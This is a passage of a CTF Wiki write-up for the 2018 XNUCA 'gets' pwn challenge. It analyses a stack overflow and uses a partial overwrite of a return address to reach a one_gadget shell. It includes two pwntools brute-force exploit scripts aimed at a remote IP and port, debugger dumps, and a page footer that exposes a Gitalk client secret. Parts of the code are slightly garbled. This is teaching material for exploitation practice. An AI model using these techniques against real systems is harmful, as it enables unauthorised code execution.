<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>

<span class="p">{</span>

<span class="kt">char</span> <span class="o">*</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp + 0h] [rbp-18h]</span>


<span class="n">gets</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">v4</span><span class="p">);</span>
  <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<p>The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. .</p>
<h4 id="determining-protection_2">Determining protection<a class="headerlink" href="#determining-protection_2" title="Permanent link">&para;</a></h4>
<p>First take a look at the protection of the program</p>
<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="mi">2018</span><span class="o">/</span><span class="mi">1124</span><span class="n">XNUCA</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">gets</span><span class="o">/</span><span class="n">gets</span><span class="err">&#39;</span>

    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="mi">-64</span><span class="o">-</span><span class="n">little</span>

    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>

    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>

    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>

    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
</code></pre></div>
<p>It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where.</p>
<h4 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h4>
<p>We know the basic execution flow of the program through the basic execution flow (executable part) of ELF. At the same time, we find that there are two function return addresses on the stack.</p>
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">stack</span> <span class="mi">25</span>

<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffe398</span> <span class="err">—▸</span> <span class="mi">0x7ffff7a2d830</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">240</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>

<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffe3a0</span> <span class="err">◂—</span> <span class="mi">0x1</span>

<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffe3a8</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe478</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe6d9</span> <span class="err">◂—</span> <span class="mi">0x6667682f746e6d2f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgf</span><span class="err">&#39;</span><span class="p">)</span>

<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffe3b0</span> <span class="err">◂—</span> <span class="mi">0x1f7ffcca0</span>

<span class="err">04:0020│</span>      <span class="err">0</span><span class="nf">x7fffffffe3b8</span> <span class="err">—▸</span> <span class="mi">0x400420</span> <span class="err">◂—</span> <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x18</span>

<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffe3c0</span> <span class="err">◂—</span> <span class="mi">0x0</span>

<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffe3c8</span> <span class="err">◂—</span> <span class="mi">0xf086047f3fb49558</span>

<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffe3d0</span> <span class="err">—▸</span> <span class="mi">0x400440</span> <span class="err">◂—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>

<span class="err">08:0040│</span>      <span class="err">0</span><span class="nf">x7fffffffe3d8</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe470</span> <span class="err">◂—</span> <span class="mi">0x1</span>

<span class="err">09:0048│</span>      <span class="err">0</span><span class="nf">x7fffffffe3e0</span> <span class="err">◂—</span> <span class="mi">0x0</span>

<span class="na">...</span> <span class="err">↓</span>

<span class="err">0</span><span class="nl">b:</span><span class="err">0058│</span>      <span class="err">0</span><span class="nf">x7fffffffe3f0</span> <span class="err">◂—</span> <span class="mi">0xf79fb00f2749558</span>

<span class="err">0</span><span class="nl">c:</span><span class="err">0060│</span>      <span class="err">0</span><span class="nf">x7fffffffe3f8</span> <span class="err">◂—</span> <span class="mi">0xf79ebba9ae49558</span>

<span class="err">0</span><span class="nl">d:</span><span class="err">0068│</span>      <span class="err">0</span><span class="nf">x7fffffffe400</span> <span class="err">◂—</span> <span class="mi">0x0</span>

<span class="na">...</span> <span class="err">↓</span>

<span class="err">10:</span> <span class="err">0080│</span> <span class="err">0</span><span class="nf">x7fffffffe418</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe488</span> <span class="err">—▸</span> <span class="mi">0x7fffffffe704</span> <span class="err">◂—</span> <span class="mi">0x504d554a4f545541</span> <span class="p">(</span><span class="err">&amp;</span><span class="mi">#39</span><span class="c1">;AUTOMOTIVE&amp;#39;)</span>
<span class="err">11:0088│</span>      <span class="err">0</span><span class="nf">x7fffffffe420</span> <span class="err">—▸</span> <span class="mi">0x7ffff7ffe168</span> <span class="err">◂—</span> <span class="mi">0x0</span>

<span class="err">12:0090│</span>      <span class="err">0</span><span class="nf">x7fffffffe428</span> <span class="err">—▸</span> <span class="mi">0x7ffff7de77cb</span> <span class="p">(</span><span class="no">_dl_init</span><span class="err">+</span><span class="mi">139</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">jmp</span>    <span class="mi">0x7ffff7de77a0</span>
</code></pre></div>
<p>Where <code>__libc_start_main+240</code> is in libc and <code>_dl_init+139</code> is in ld</p>
<div class="highlight"><pre><span></span><code>0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
</code></pre></div>
<p>A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ?</p>
<p>Let&#39;s first analyze the base address <code>0x7ffff7a0d000</code> of <code>libc</code>. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by <code>gets</code>, which means that <code>\x00</code> will definitely exist at the end of the string.</p>
<p>When we cover the bytes, we must cover the integer multiples, that is, we will cover at least 3 bytes, and let&#39;s take a look at the address <code>0x7ffff7a2d830</code> of <code>__libc_start_main+240</code>. If it covers 3 bytes, it is <code>0x7ffff700xxxx</code>, has been less than the base address of libc, there is no code position deliberately executed before.</p>
<p>In general, the offset of libc_start_main in libc is not too bad, so obviously if we overwrite <code>__libc_start_main+240</code>, it is obviously impossible.</p>
<p>And the base address of ld? If we overwrite <code>_dl_init+139</code> on the stack, it is <code>0x7ffff700xxxx</code>. Looking at the above memory layout, we can find that <code>libc</code> is in the low address direction of <code>ld</code>, so when randomizing, it is very likely that the third byte of libc is <code>\x00</code>.</p>
<p>For example, the current offset between the two is</p>
<div class="highlight"><pre><span></span><code>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
</code></pre></div>
<p>Then if ld is loaded to <code>0x7ffff73ca000</code>, then the starting address of <code>libc</code> is obviously <code>0x7ffff7000000</code>.</p>
<p>Therefore, we have a good reason to choose to overwrite the <code>_dl_init+139</code> stored on the stack. So what is it covered? Still don&#39;t know. Because we don&#39;t know what the library version of libc is,</p>
<p>We can cover the coverage first and see if the program will crash. After all, it is very likely that the code in the libc library will be executed.</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="c1">#context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>

    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">elfpath</span> <span class="o">=</span> <span class="s1">&#39;./gets&#39;</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfpath</span>



<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="n">elf</span> <span class="n">path</span><span class="p">)</span>
<span class="n">bits</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bits</span>





<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">):</span>

        <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>

            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfpath</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

        <span class="c1"># gdb.attach(p)</span>

        <span class="k">try</span><span class="p">:</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x18</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40059B</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>

                <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40059B</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

            <span class="nb">print</span> <span class="n">data</span>

            <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

            <span class="k">continue</span>





<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>

    <span class="n">exp</span><span class="p">(</span><span class="s1">&#39;106.75.4.189&#39;</span><span class="p">,</span> <span class="mi">35273</span><span class="p">)</span>
</code></pre></div>
<p>Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by <code>(cfree+0x4c)[0x7f57b6f9253c]</code>.</p>
<div class="highlight"><pre><span></span><code>======= Backtrace: =========

/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]

/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]

/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]

/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]

[0x7ffdec480f20]

======= Memory map: ========

00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets

00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets

00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]

7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0

7f57b0021000-7f57b4000000 ---p 00000000 00:00 0

7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1

7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1

7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0

7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]

7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]

7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]

ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
</code></pre></div>
<p>After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address.</p>
<div class="highlight"><pre><span></span><code>➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6

0x45216 execve<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>, rsp+0x30, environ<span class="o">)</span>

constraints:

  <span class="nv">rax</span> <span class="o">==</span> NULL



0x4526a execve<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>, rsp+0x30, environ<span class="o">)</span>

constraints:

  <span class="o">[</span>rsp+0x30<span class="o">]</span> <span class="o">==</span> NULL



0xf02a4 execve<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>, rsp+0x50, environ<span class="o">)</span>

constraints:

  <span class="o">[</span>rsp+0x50<span class="o">]</span> <span class="o">==</span> NULL



0xf1147 execve<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>, rsp+0x70, environ<span class="o">)</span>

constraints:

  <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
</code></pre></div>
<p>Continue to blast with the following exp,</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="c1">#context.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>

    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">elfpath</span> <span class="o">=</span> <span class="s1">&#39;./gets&#39;</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfpath</span>



<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="n">elf</span> <span class="n">path</span><span class="p">)</span>
<span class="n">bits</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bits</span>





<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">):</span>

        <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>

            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfpath</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

        <span class="c1"># gdb.attach(p)</span>

        <span class="k">try</span><span class="p">:</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x18</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40059B</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>

                <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40059B</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x16\02</span><span class="s1">&#39;</span>

            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>



<span class="n">p</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;ls&amp;#39;)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

            <span class="nb">print</span> <span class="n">data</span>

            <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>

            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

            <span class="k">continue</span>





<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>

    <span class="n">exp</span><span class="p">(</span><span class="s1">&#39;106.75.4.189&#39;</span><span class="p">,</span> <span class="mi">35273</span><span class="p">)</span>
</code></pre></div>
<p>Finally get the shell.</p>
<div class="highlight"><pre><span></span><code><span class="err">$</span> <span class="n">ls</span>
<span class="n">exp</span><span class="o">.</span><span class="n">py</span>  <span class="n">gets</span>
</code></pre></div>
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2020 CTF Wiki Team
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/vendor.a018d6bb.min.js"></script>
      <script src="../../../../assets/javascripts/bundle.4b42b5e6.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../../..",
          features: ['tabs'],
          search: Object.assign({
            worker: "../../../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>